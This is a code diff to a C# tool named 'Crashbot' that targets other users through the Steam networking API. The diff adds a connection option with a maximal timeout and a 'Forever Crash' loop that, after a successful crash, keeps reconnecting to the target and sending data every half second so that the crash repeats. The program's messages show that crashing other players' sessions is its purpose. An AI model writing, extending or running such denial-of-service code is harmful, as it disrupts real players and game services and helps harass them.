@@ -23,6 +23,15 @@ namespace Crashbot
             }
         ];
 
+        private static readonly SteamNetworkingConfigValue_t[] PersistantTimeoutOptions = [
+            new SteamNetworkingConfigValue_t
+            {
+                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
+                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
+                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = Int32.MaxValue }
+            }
+        ];
+
         static void Main(string[] args)
         {
             Environment.CurrentDirectory = Directory.GetParent(Assembly.GetExecutingAssembly()?.Location ?? AppContext.BaseDirectory)!.FullName;
@@ -79,6 +88,15 @@ namespace Crashbot
 
                 bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
                 Console.WriteLine($"[{DateTime.Now}] {(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private")}");
+
+                // Forever Crash
+                while (crashed)
+                {
+                    var (conn_x, _) = ConnectAndWait(target, PersistantTimeoutOptions);
+                    Program.ReadOneAndSendOne(conn_x, 0, 0, 0);
+                    Thread.Sleep(500);
+                    Steamworks.SteamNetworkingSockets.CloseConnection(conn_x, 0, string.Empty, false);
+                }
             }
         }
 
